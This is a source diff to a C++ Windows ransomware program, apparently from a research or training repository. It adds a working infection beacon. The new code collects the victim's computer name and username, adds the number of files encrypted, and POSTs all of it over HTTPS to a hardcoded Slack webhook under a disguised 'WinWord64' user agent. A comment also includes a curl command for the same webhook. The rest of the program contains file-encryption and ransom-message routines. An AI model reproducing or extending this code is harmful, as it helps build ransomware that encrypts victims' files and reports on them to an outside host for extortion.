@@ -25,6 +25,9 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <Shlobj.h>
+#include <winhttp.h>
+
+#pragma comment (lib, "Winhttp.lib")
 
 namespace fs = std::experimental::filesystem;
 
@@ -98,6 +101,8 @@ void PrintProgress();
 std::string wstrtostr(const std::wstring& wstr);
 void HexToString(const std::string hexstr, std::string& str);
 void DecodeStrings();
+std::string GetLocalComputerName();
+std::string GetCurrentUser();
 
 
 
@@ -297,10 +302,121 @@ bool AnalysisCheck()
 
 void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 {
-	// TODO: Add code to send an infection beacon to a website, twitter, 
-	//       slack, email, or some other network destination to track infections
+	// Sends an infection beacon to a slack channel to track infections
 	//
-	// Beacon data could include machinename, username, # files encrypted, etc
+	// Beacon data includes machinename, username, # files encrypted
+	
+	/*	
+	Slack App details for reporting infection status
+
+	curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' https://hooks.slack.com/services/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
+
+	https://hooks.slack.com/services/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
+	*/
+
+	bool fSuccess = false;
+	HINTERNET hSession = NULL;
+	HINTERNET hConnect = NULL;
+	HINTERNET hRequest = NULL;
+
+	// Use WinHttpOpen to obtain a HTTP session handle
+	hSession = WinHttpOpen(
+		L"WinWord64/1.0",
+		WINHTTP_ACCESS_TYPE_NO_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 
+		0);
+
+	// Connect to the beacon HTTP server
+	if (hSession)
+	{
+		hConnect = WinHttpConnect(
+			hSession,
+			L"hooks.slack.com",
+			INTERNET_DEFAULT_HTTPS_PORT,
+			0);
+	}
+
+
+	// Create an HTTP Open Request handle
+	if (hConnect)
+	{
+		//std::cout << "Connected..." << std::endl;
+
+		hRequest = WinHttpOpenRequest(
+			hConnect,
+			L"POST",
+			L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			WINHTTP_FLAG_SECURE);
+	}
+
+	//
+	// Prepare POST request headers and data
+	//
+	std::string jsonheader = "Content-type: application/json\r\n";
+	std::wstring jsonheader_w = std::wstring(jsonheader.begin(), jsonheader.end());
+	LPCWSTR headers = jsonheader_w.c_str();
+	DWORD headersLength = -1;
+
+	std::string post = "{ \"text\":\"New Infection!";
+	std::string computerName = GetLocalComputerName();
+	post.append(" Computer: ");
+	post.append(computerName);
+	
+	std::string userName = GetCurrentUser();
+	post.append("; User: ");
+	post.append(userName);
+
+	post.append("; Files Infected: ");
+	post.append(std::to_string(dwEncryptedFileCount));
+
+	post.append("\" }");
+
+
+	// Send the WinHttp POST request
+	if (hRequest)
+	{
+		fSuccess = WinHttpSendRequest(
+			hRequest,
+			headers,
+			headersLength,
+			(void*)post.c_str(),
+			static_cast<unsigned long>(post.length()),
+			static_cast<unsigned long>(post.length()),
+			0);
+	}
+
+	// Check for errors
+	if (!fSuccess)
+	{
+		DWORD dwStatus;
+		dwStatus = GetLastError();
+
+		LPVOID lpMsgBuf;
+		FormatMessage(
+			FORMAT_MESSAGE_ALLOCATE_BUFFER |
+			FORMAT_MESSAGE_FROM_SYSTEM |
+			FORMAT_MESSAGE_IGNORE_INSERTS,
+			NULL,
+			dwStatus,
+			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+			(LPTSTR)& lpMsgBuf,
+			0, NULL);
+
+#ifdef TRACEOUTPUT
+
+		std::cout << "SendInfectionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+		std::wcout << "SendInfectionBeacon error:  " << (LPTSTR)lpMsgBuf;
+#endif
+	}
+
+	// Close open handles.
+	if (hRequest) WinHttpCloseHandle(hRequest);
+	if (hConnect) WinHttpCloseHandle(hConnect);
+	if (hSession) WinHttpCloseHandle(hSession);
+
 }
 
 void RansomMessage(DWORD dwEncryptedFileCount)
@@ -484,7 +600,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 
 	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
 	{
-		DWORD err = GetLastError();
+		DWORD dwStatus = GetLastError();
 #ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
@@ -650,7 +766,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 
 	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
 	{
-		DWORD err = GetLastError();
+		DWORD dwStatus = GetLastError();
 #ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
@@ -1065,4 +1181,37 @@ void HexToString(const std::string hexstr, std::string & str)
 		str[i] = (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) << 4, j++;
 		str[i] |= (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) & 0xF;
 	}
+}
+
+std::string GetLocalComputerName()
+{
+	WCHAR buffer[512] = L"";
+	DWORD dwSize = sizeof(buffer);
+
+	GetComputerNameEx(ComputerNameDnsFullyQualified, buffer, &dwSize);
+	//GetComputerName(buffer, &dwSize);
+
+	char chxfer[512];
+	char defaultChar = ' ';
+	WideCharToMultiByte(CP_ACP, 0, buffer, -1, chxfer, 260, &defaultChar, NULL);
+
+	std::string computerName(chxfer);
+
+	return computerName;
+}
+
+std::string GetCurrentUser()
+{
+	WCHAR buffer[512] = L"";
+	DWORD dwSize = sizeof(buffer);
+
+	GetUserName(buffer, &dwSize);
+
+	char chxfer[512];
+	char defaultChar = ' ';
+	WideCharToMultiByte(CP_ACP, 0, buffer, -1, chxfer, 260, &defaultChar, NULL);
+
+	std::string userName(chxfer);
+
+	return userName;
 }
